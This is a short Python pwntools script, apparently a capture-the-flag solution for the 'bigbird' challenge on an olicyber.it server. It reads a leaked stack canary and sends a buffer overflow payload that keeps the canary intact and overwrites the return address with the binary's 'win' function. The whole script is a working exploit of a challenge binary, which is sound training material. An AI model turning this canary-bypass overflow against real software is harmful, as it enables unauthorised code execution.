from pwn import *

r = remote("bigbird.challs.olicyber.it", 12006)

exe = ELF("./bigbird")
addr = exe.sym['win']

r.recvuntil(b'BIG BIRD:')
canary = int(r.recvline().decode().strip(), 16)
r.recvline()

r.sendline(b'a'*40 + p64(canary) + b'p'*8 + p64(addr))

r.interactive()